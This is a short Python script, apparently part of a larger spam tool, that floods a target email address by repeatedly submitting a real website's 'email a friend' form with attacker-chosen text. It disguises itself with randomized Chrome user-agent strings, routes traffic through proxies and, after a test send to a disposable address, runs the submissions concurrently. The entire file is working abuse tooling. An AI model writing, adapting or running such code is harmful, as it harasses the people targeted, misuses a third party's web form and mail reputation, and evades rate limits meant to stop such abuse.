from os.path import basename

import faker
import requests

import module

url = 'https://preferhome.com/email-form/'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        headers = {
            'user-agent': faker.Faker().chrome(),
        }
        text = self.get_text(target=target)
        data = {
            'fm-name': text,
            'fm-email': target,
            'fm-fname': text,
            'fm-friend-email': target,
            'fm-comments': text,
            'fm-previous-Title': '',
            'fm-previous-URL': 'preferhome.com',
            'Submit': 'Submit',
        }
        response = requests.post(
            url,
            headers=headers,
            data=data,
            proxies=self.get_proxies(), timeout=10
        )
        return response


def main():
    s = 'Thank you'

    spam = ConcreteSpam(
        basename(__file__)[:-3], s
    )
    res = spam.send_post('wezxasqw@1secmail.com')
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
